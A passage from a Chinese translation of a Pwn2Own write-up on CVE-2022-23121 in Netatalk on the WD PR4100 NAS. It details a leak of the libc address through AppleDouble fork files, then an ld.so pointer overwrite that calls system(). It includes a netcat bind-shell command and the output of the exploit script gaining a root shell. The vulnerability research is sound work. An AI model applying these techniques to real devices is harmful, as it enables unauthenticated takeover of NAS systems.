      0x7fffa49fc000     0x7fffa49fe000     0x2000        0x0 [vdso]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
</pre></table></code></div></div><p>如果你看一下之前提到的<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>函数的代码，你会注意到这是肯定的，因为是一个局部变量<code class="language-plaintext highlighter-rouge">struct adouble adosx;</code>（因此存储于栈上）保存了AppleDouble结构体，并一直传递到了<code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>函数。</p><p>所以这意味着什么？好吧，<code class="language-plaintext highlighter-rouge">memcpy()</code>函数从一个基于栈的偏移地址写入32字节至文件在内存中映射的区域。这意味着我们可以让程序将任意的内存内容写回磁盘上的文件中。之后我们可以通过SMB读取fork文件的内容（以AppleDouble格式存储）并且可以将这部分泄露的内容读出来。</p><p>这非常好，但是程序的栈上是否有<code class="language-plaintext highlighter-rouge">libc.so</code>库的地址泄露出来呢？因为我们想要调用<code class="language-plaintext highlighter-rouge">libc.so</code>库中的<code class="language-plaintext highlighter-rouge">system()</code>函数。</p><p>事实证明这种地址是有的，因为<code class="language-plaintext highlighter-rouge">main()</code>函数是从<code class="language-plaintext highlighter-rouge">__libc_start_main()</code>函数中被调用的：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>.text:0000000000023FB0 __libc_start_main proc near 
...
.text:0000000000024099                 call    rax             ; main()
.text:000000000002409B
.text:000000000002409B loc_2409B:                              ; CODE XREF: __libc_start_main+15A↓j
.text:000000000002409B                 mov     edi, eax
.text:000000000002409D                 call    __GI_exit
</pre></table></code></div></div><h1 id="合并利用">合并利用</h1><p>在西部数据PR4100设备的默认配置中，我们可以通过AFP和SMB协议来在认证之前读写<code class="language-plaintext highlighter-rouge">Public</code>共享目录中的任意文件。</p><p>我们还知道，一个<code class="language-plaintext highlighter-rouge">afpd</code>子进程是从<code class="language-plaintext highlighter-rouge">afpd</code>父进程fork而来，用来处理每个客户端连接的。这意味着每个子进程对所有已经加载的库都有相同的随机性。</p><p>为了触发该漏洞，我们需要一个<code class="language-plaintext highlighter-rouge">mooncake</code>常规文件存在于共享目录中，以及一个精心构造的<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件存在于相同的目录中。然后，我们可以通过AFP调用“FPOpenFork”命令访问<code class="language-plaintext highlighter-rouge">mooncake</code>文件，该命令会解析<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件（以AppleDouble文件格式保存）。最终它会调用<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>函数，该函数负责将苹果的AppleDouble文件转换为一个更简单的格式版本。</p><p>因此，我们首先创建<code class="language-plaintext highlighter-rouge">mooncake</code>文件。我们通过AFP接口创建，但是我们认为也可以通过SMB来创建。之后我们想触发两次漏洞。</p><p>第一次，我们构造<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件来滥用<code class="language-plaintext highlighter-rouge">ad_rebuild_adouble_header_osx()</code>中的<code class="language-plaintext highlighter-rouge">memcpy()</code>函数。当触发漏洞时：</p><ul><li>原始的<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件通过<code class="language-plaintext highlighter-rouge">mmap()</code>函数被映射进内存<li><code class="language-plaintext highlighter-rouge">memcpy()</code>函数将<code class="language-plaintext highlighter-rouge">__libc_start_main()</code>函数的返回地址写入被映射的区域<li><code class="language-plaintext highlighter-rouge">munmap()</code>函数被调用，上述地址被保存进磁盘上的<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件<li>我们可以通过SMB协议读取<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件来获取泄漏出的地址（就像读取常规文件一样）</ul><p>这样一来，我们就可以推断出<code class="language-plaintext highlighter-rouge">libc.so</code>的基地址，并且计算出<code class="language-plaintext highlighter-rouge">system()</code>函数的地址。</p><p>第二次，我们精心构造<code class="language-plaintext highlighter-rouge">._mooncake</code> fork文件，滥用<code class="language-plaintext highlighter-rouge">ad_convert_osx()</code>函数中的<code class="language-plaintext highlighter-rouge">memmove()</code>函数。当触发漏洞时：</p><ul><li><code class="language-plaintext highlighter-rouge">._mooncake</code>原始fork文件通过<code class="language-plaintext highlighter-rouge">mmap()</code>函数被映射进内存<li><code class="language-plaintext highlighter-rouge">memmove()</code>函数覆盖了<code class="language-plaintext highlighter-rouge">ld.so</code>的<code class="language-plaintext highlighter-rouge">.data</code>段，破坏<code class="language-plaintext highlighter-rouge">rtld_local._dl_rtld_lock_recursive</code>函数指针，将其篡改为<code class="language-plaintext highlighter-rouge">system()</code>函数的地址，破坏<code class="language-plaintext highlighter-rouge">rtld_local._dl_load_lock</code>的数据，篡改为要执行的shell命令<li>由于访问了非法的未映射的栈地址，<code class="language-plaintext highlighter-rouge">memcpy()</code>函数崩溃<li>Netatalk的异常处理函数调用并进入<code class="language-plaintext highlighter-rouge">dl_open()</code>函数，由于上一步已经篡改了相关内容，因此会调用<code class="language-plaintext highlighter-rouge">system()</code>函数，并执行我们指定的任意shell命令</ul><p>我们预先通过SMB协议在共享目录中放置了一个静态变异的<code class="language-plaintext highlighter-rouge">netcat</code>程序，并通过以下路径执行：<code class="language-plaintext highlighter-rouge">/mnt/HD/HD_a2/Public/tools/netcat -nvlp 9999 -e /bin/sh</code>。</p><p>下面是漏洞利用时的过程：</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre># ./mooncake.py -i 192.168.1.3
(12:26:23) [*] Triggering leak...
(12:26:27) [*] Connected to AFP server
(12:26:27) [*] Leaked libc return address: 0x7f45e23f809b
(12:26:27) [*] libc base: 0x7f45e23d4000
(12:26:27) [*] Triggering system() call...
(12:26:27) [*] Using system address: 0x7f45e24189c0
(12:26:27) [*] Connected to AFP server
(12:26:29) [*] Connection timeout detected :)
(12:26:30) [*] Spawning a shell. Type any command.
uname -a
Linux MyCloudPR4100 4.14.22 #1 SMP Mon Dec 21 02:16:13 UTC 2020 Build-32 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) euid=501(nobody) egid=1000(share) groups=1000(share)
pwd
/mnt/HD/HD_a2/Public/edg
</pre></table></code></div></div><h2 id="pwn2own-笔记">Pwn2Own 笔记</h2><p>当比赛时利用该漏洞时，第一次尝试失败在了地址泄露阶段。我们猜测相比于我们自己的测试环境，可能是由于目标环境的时机问题所导致的。因此我们修改了代码，在泄露地址之前引入一个<code class="language-plaintext highlighter-rouge">sleep()</code>，以确保samba有时间返回我们通过漏洞修改的数据。我们的第二次尝试获取了泄露地址，但是尝试通过telnet连接目标时再次失败了，因此我们在连接telnet之前又额外添加了一个<code class="language-plaintext highlighter-rouge">sleep()</code>，以确保<code class="language-plaintext highlighter-rouge">system()</code>命令被正确的执行。幸运的是这很有效，这说明单单添加额外的休眠时间足以修复不可靠的漏洞利用，我们在我们最后的第三次尝试成功了🙂。</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/pwn/'>pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-tag no-text-decoration" >漏洞分析</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121） - gtrboy's blog&url=https://gtrboy.github.io/posts/CVE-2022-23121/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121） - gtrboy's blog&u=https://gtrboy.github.io/posts/CVE-2022-23121/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=【翻译】西部数据PR4100 NAS RCE漏洞分析（CVE-2022-23121） - gtrboy's blog&url=https://gtrboy.github.io/posts/CVE-2022-23121/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/bus/">物联网设备消息总线机制的使用及安全问题</a><li><a href="/posts/malloc/">malloc源码学习（glibc-2.23）</a><li><a href="/posts/L_star/">L* 算法学习</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/l-%E7%AE%97%E6%B3%95/">L*算法</a> <a class="post-tag" href="/tags/malloc%E6%BA%90%E7%A0%81/">malloc源码</a> <a class="post-tag" href="/tags/pwnable-tw/">pwnable.tw</a> <a class="post-tag" href="/tags/%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/">消息总线</a> <a class="post-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/netatalk/"><div class="card-body"> <span class="timeago small" > Nov 8, 2021 <i class="unloaded">2021-11-08T08:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>pwnable.tw CVE-2018-1160</h3><div class="text-muted small"><p> pwnable.tw于2020年新增题目CVE-2018-1160，分值100，题目曾出现在hitcon2019，1day漏洞利用。漏洞源自于一款开源的苹果AFP（Apple Filing Protocol）协议服务器程序Netatalk。和xuanxuan一起做了这道题。 可参考wp如下： CVE-2018-1160: Expanding the original...</p></div></div></a></div><div class="card"> <a href="/posts/L_star/"><div class="card-body"> <span class="timeago small" > Jul 27, 2021 <i class="unloaded">2021-07-27T17:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>L* 算法学习</h3><div class="text-muted small"><p> 本篇旨在记录自己学习L*算法的过程和理解。 参考： 吴礼发老师的《网络协议逆向分析及应用》 L*算法创世文：Learning Regular Sets from Queries and Counterexamples* 基于米利机的LM*算法：Reverse Engineering Enhanced State Models of Black Box So...</p></div></div></a></div><div class="card"> <a href="/posts/malloc/"><div class="card-body"> <span class="timeago small" > Jul 25, 2021 <i class="unloaded">2021-07-25T17:20:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>malloc源码学习（glibc-2.23）</h3><div class="text-muted small"><p> 学习glibc-2.23源码中malloc相关知识，文章顺序和malloc流程相同。本文仅为自己缕清思路用，因此很多细节和基础没有涉及，可能会比较乱。若你看到了这篇文章，推荐看下面的博客，介绍得可能会更加细致。 参考： Linux内存分配小结–malloc、brk、mmap 董哥的黑板报 - 堆漏洞挖掘 堆漏洞挖掘中的bins分类(fastbin、u...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/netatalk/" class="btn btn-outline-primary" prompt="Older"><p>pwnable.tw CVE-2018-1160</p></a> <span class="btn btn-outline-primary disabled" prompt="Newer"><p>-</p></span></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="">gtrboy</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/l-%E7%AE%97%E6%B3%95/">L*算法</a> <a class="post-tag" href="/tags/malloc%E6%BA%90%E7%A0%81/">malloc源码</a> <a class="post-tag" href="/tags/pwnable-tw/">pwnable.tw</a> <a class="post-tag" href="/tags/%E6%B6%88%E6%81%AF%E6%80%BB%E7%BA%BF/">消息总线</a> <a class="post-tag" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://gtrboy.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script>
